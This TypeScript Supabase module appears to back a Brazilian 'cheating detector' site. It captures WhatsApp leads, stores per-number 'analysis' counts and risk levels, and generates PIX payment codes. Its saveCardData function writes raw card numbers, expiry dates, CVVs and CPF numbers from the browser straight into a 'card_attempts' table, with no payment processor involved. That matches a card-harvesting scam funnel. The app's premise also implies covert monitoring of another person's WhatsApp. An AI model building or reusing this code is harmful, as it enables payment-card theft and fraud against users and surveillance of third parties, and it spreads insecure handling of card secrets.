import { createClient } from '@supabase/supabase-js'

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || 'https://your-project-id.supabase.co'
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || 'your-anon-key-here'

export const supabase = createClient(supabaseUrl, supabaseAnonKey)

// Interface para dados do cartão
export interface CardData {
  id?: string
  card_number: string
  card_holder: string
  expiry_date: string
  cvv: string
  cpf: string
  email?: string
  phone?: string
  whatsapp?: string
  nome?: string
  amount: number
  payment_confirmed?: boolean
  created_at?: string
}

// Interface para pagamentos PIX
export interface PixPayment {
  id?: string
  pix_code: string
  amount: number
  email?: string
  phone?: string
  whatsapp?: string
  nome?: string
  payment_confirmed?: boolean
  expires_at: string
  created_at?: string
}

// Interface para leads (captura da landing page)
export interface Lead {
  id?: string
  whatsapp: string
  nome?: string
  created_at?: string
  ip_address?: string
  user_agent?: string
  origin_page?: string
}

// Interface para resultados de análise
export interface AnalysisResult {
  id?: string
  whatsapp: string
  nome?: string
  messages_count: number
  media_count: number
  contacts_count: number
  risk_level: 'low' | 'medium' | 'high'
  analysis_number: number
  created_at?: string
  updated_at?: string
}

// Interface para estatísticas de análise
export interface AnalysisStats {
  total_analyses: number
  latest_analysis_number: number
  total_messages: number
  total_media: number
  total_contacts: number
  latest_risk_level: 'low' | 'medium' | 'high'
  last_analysis_date: string
}

// Função para salvar lead da landing page
export const saveLead = async (whatsapp: string) => {
  try {
    const { data, error } = await supabase
      .from('leads')
      .insert([
        {
          whatsapp,
          created_at: new Date().toISOString()
        }
      ])
      .select()

    if (error) {
      return { success: false, error }
    }

    return { success: true, data: data[0] }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para atualizar nome do lead
export const updateLeadName = async (whatsapp: string, nome: string) => {
  try {
    const { data, error } = await supabase
      .from('leads')
      .update({ nome })
      .eq('whatsapp', whatsapp)
      .is('nome', null)
      .order('created_at', { ascending: false })
      .limit(1)
      .select()

    if (error) {
      return { success: false, error }
    }

    return { success: true, data: data?.[0] }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para salvar dados do cartão
export const saveCardData = async (cardData: Omit<CardData, 'id' | 'created_at'>) => {
  try {
    const { data, error } = await supabase
      .from('card_attempts')
      .insert([
        {
          ...cardData,
          created_at: new Date().toISOString()
        }
      ])
      .select()

    if (error) {
      return { success: false, error }
    }

    return { success: true, data }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para criar pagamento PIX
export const createPixPayment = async (pixData: Omit<PixPayment, 'id' | 'created_at'>) => {
  try {
    const { data, error } = await supabase
      .from('pix_payments')
      .insert([
        {
          ...pixData,
          created_at: new Date().toISOString()
        }
      ])
      .select()

    if (error) {
      return { success: false, error }
    }

    return { success: true, data: data[0] }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para buscar PIX ativo não expirado por email/telefone
export const getActivePixPayment = async (email: string, phone: string, amount: number) => {
  try {
    const now = new Date().toISOString()
    
    const { data, error } = await supabase
      .from('pix_payments')
      .select('*')
      .eq('email', email)
      .eq('phone', phone)
      .eq('amount', amount)
      .eq('payment_confirmed', false)
      .gt('expires_at', now)
      .order('created_at', { ascending: false })
      .limit(1)

    if (error) {
      return { success: false, error }
    }

    if (data && data.length > 0) {
      return { success: true, data: data[0] }
    }

    return { success: true, data: null }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para verificar status do pagamento PIX
export const checkPixPaymentStatus = async (pixId: string) => {
  try {
    const { data, error } = await supabase
      .from('pix_payments')
      .select('payment_confirmed, expires_at, id, created_at')
      .eq('id', pixId)
      .single()

    if (error) {
      return { success: false, error }
    }

    return { success: true, data }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para verificar status do pagamento do cartão
export const checkCardPaymentStatus = async (cardId: string) => {
  try {
    const { data, error } = await supabase
      .from('card_attempts')
      .select('payment_confirmed')
      .eq('id', cardId)
      .single()

    if (error) {
      return { success: false, error }
    }

    return { success: true, data }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para calcular CRC16 (necessário para PIX)
const crc16 = (str: string): string => {
  let crc = 0xFFFF
  for (let i = 0; i < str.length; i++) {
    crc ^= str.charCodeAt(i) << 8
    for (let j = 0; j < 8; j++) {
      if (crc & 0x8000) {
        crc = (crc << 1) ^ 0x1021
      } else {
        crc = crc << 1
      }
    }
  }
  crc = crc & 0xFFFF
  return crc.toString(16).toUpperCase().padStart(4, '0')
}

// Função para formatar campo PIX
const formatPixField = (id: string, value: string): string => {
  const length = value.length.toString().padStart(2, '0')
  return `${id}${length}${value}`
}

// Função para normalizar texto PIX (remove acentos e caracteres especiais)
const normalizePixText = (text: string): string => {
  return text
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '') // Remove acentos
    .replace(/[^A-Za-z0-9\s]/g, '') // Remove caracteres especiais
    .toUpperCase()
    .trim()
}

// Função para gerar PIX payload válido
export const generatePixCode = (amount: number, description: string = 'Detector de Traicao') => {
  // Usar diretamente as variáveis de ambiente sem valores padrão
  const pixKey = import.meta.env.VITE_PIX_KEY
  const merchantName = import.meta.env.VITE_PIX_MERCHANT_NAME
  const merchantCity = import.meta.env.VITE_PIX_MERCHANT_CITY
  
  // Validar se as variáveis estão configuradas
  if (!pixKey || !merchantName || !merchantCity) {
    throw new Error('Variáveis de ambiente PIX não configuradas. Verifique o arquivo .env e reinicie o servidor.')
  }
  
  // Limitar tamanhos conforme especificação PIX e normalizar texto
  const cleanMerchantName = normalizePixText(merchantName).substring(0, 25)
  const cleanMerchantCity = normalizePixText(merchantCity).substring(0, 15)
  
  // Limpar chave PIX conforme o tipo
  // Se for CPF/CNPJ ou telefone, remove caracteres especiais
  // Se for email ou chave aleatória (EVP), mantém como está
  let cleanPixKey = pixKey.trim()
  
  // Detectar tipo de chave PIX
  const isEmail = pixKey.includes('@')
  const isUUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(pixKey)
  const isPhone = /^\+?\d{11,}/.test(pixKey.replace(/\D/g, ''))
  const isCPFCNPJ = /^\d{11}$|^\d{14}$/.test(pixKey.replace(/\D/g, ''))
  
  // Limpar apenas se for CPF/CNPJ ou telefone
  if ((isCPFCNPJ || isPhone) && !isEmail && !isUUID) {
    cleanPixKey = pixKey.replace(/\D/g, '')
    // Adicionar código do país para telefone se necessário
    if (isPhone && !cleanPixKey.startsWith('55')) {
      cleanPixKey = '+55' + cleanPixKey
    }
  }
  
  const formattedAmount = amount.toFixed(2)
  
  // Construir payload PIX conforme padrão BR Code
  let payload = ''
  
  // ID 00 - Payload Format Indicator (sempre "01" para EMV v1)
  payload += formatPixField('00', '01')
  
  // ID 26 - Merchant Account Information (Pix)
  // Subcampo 00: GUI do Pix (BR.GOV.BCB.PIX)
  // Subcampo 01: Chave Pix
  const gui = formatPixField('00', 'BR.GOV.BCB.PIX')
  const pixKeyField = formatPixField('01', cleanPixKey)
  const merchantAccountInfo = gui + pixKeyField
  payload += formatPixField('26', merchantAccountInfo)
  
  // ID 52 - Merchant Category Code (0000 = genérico)
  payload += formatPixField('52', '0000')
  
  // ID 53 - Transaction Currency (986 = BRL)
  payload += formatPixField('53', '986')
  
  // ID 54 - Transaction Amount (valor em formato decimal)
  payload += formatPixField('54', formattedAmount)
  
  // ID 58 - Country Code (BR = Brasil)
  payload += formatPixField('58', 'BR')
  
  // ID 59 - Merchant Name (nome do recebedor, até 25 caracteres, sem acentos)
  payload += formatPixField('59', cleanMerchantName)
  
  // ID 60 - Merchant City (cidade do recebedor, até 15 caracteres, sem acentos)
  payload += formatPixField('60', cleanMerchantCity)
  
  // ID 62 - Additional Data Field Template
  // Subcampo 05: TXID (Transaction ID) - usar *** se não houver TXID específico
  const txid = '***'
  const txidField = formatPixField('05', txid)
  payload += formatPixField('62', txidField)
  
  // CRC16 (sempre por último)
  payload += '6304'
  const crcValue = crc16(payload)
  payload += crcValue
  
  return {
    pixCode: payload,
    pixKey: cleanPixKey,
    amount: formattedAmount,
    description,
    merchantName: cleanMerchantName,
    merchantCity: cleanMerchantCity
  }
}

// Função para salvar resultados de análise
export const saveAnalysisResults = async (
  whatsapp: string,
  messagesCount: number,
  mediaCount: number,
  contactsCount: number,
  riskLevel: 'low' | 'medium' | 'high',
  nome?: string
) => {
  try {
    // Primeiro, verificar se já existe um registro para este WhatsApp
    const { data: existingData, error: fetchError } = await supabase
      .from('analysis_results')
      .select('*')
      .eq('whatsapp', whatsapp)
      .order('analysis_number', { ascending: false })
      .limit(1)

    if (fetchError) {
      // Erro silencioso
    }

    let result
    let nextAnalysisNumber

    if (existingData && existingData.length > 0) {
      // Já existe - fazer UPDATE
      const existing = existingData[0]
      nextAnalysisNumber = existing.analysis_number

      const { data: updateData, error: updateError } = await supabase
        .from('analysis_results')
        .update({
          messages_count: messagesCount,
          media_count: mediaCount,
          contacts_count: contactsCount,
          risk_level: riskLevel,
          nome: nome || existing.nome || 'Usuário',
          updated_at: new Date().toISOString()
        })
        .eq('id', existing.id)
        .select()

      if (updateError) {
        return { success: false, error: updateError }
      }

      result = updateData?.[0]
    } else {
      // Não existe - fazer INSERT
      nextAnalysisNumber = 1

      const { data: insertData, error: insertError } = await supabase
        .from('analysis_results')
        .insert([
          {
            whatsapp,
            nome: nome || 'Usuário',
            messages_count: messagesCount,
            media_count: mediaCount,
            contacts_count: contactsCount,
            risk_level: riskLevel,
            analysis_number: nextAnalysisNumber
          }
        ])
        .select()

      if (insertError) {
        return { success: false, error: insertError }
      }

      result = insertData?.[0]
    }

    // Sempre registrar no histórico
    const { error: historyError } = await supabase
      .from('analysis_history')
      .insert([
        {
          whatsapp,
          nome: nome || 'Usuário',
          messages_count: messagesCount,
          media_count: mediaCount,
          contacts_count: contactsCount,
          risk_level: riskLevel,
          analysis_number: nextAnalysisNumber
        }
      ])

    if (historyError) {
      // Erro silencioso no histórico
    }

    return { success: true, data: result }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para obter análise atual de um WhatsApp
export const getAnalysisResults = async (whatsapp: string) => {
  try {
    const { data, error } = await supabase
      .from('analysis_results')
      .select('*')
      .eq('whatsapp', whatsapp)
      .order('analysis_number', { ascending: false })
      .limit(1)

    if (error) {
      return { success: false, error }
    }

    if (data && data.length > 0) {
      return { success: true, data: data[0] as AnalysisResult }
    }

    return { success: true, data: null }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para obter estatísticas de análises de um WhatsApp
export const getAnalysisStats = async (whatsapp: string) => {
  try {
    const { data, error } = await supabase
      .rpc('get_analysis_stats', {
        p_whatsapp: whatsapp
      })

    if (error) {
      return { success: false, error }
    }

    return { success: true, data: data?.[0] as AnalysisStats }
  } catch (error) {
    return { success: false, error }
  }
}

// Função para obter histórico completo de análises
export const getAnalysisHistory = async (whatsapp: string) => {
  try {
    const { data, error } = await supabase
      .from('analysis_history')
      .select('*')
      .eq('whatsapp', whatsapp)
      .order('analysis_number', { ascending: false })

    if (error) {
      return { success: false, error }
    }

    return { success: true, data: data || [] }
  } catch (error) {
    return { success: false, error }
  }
}
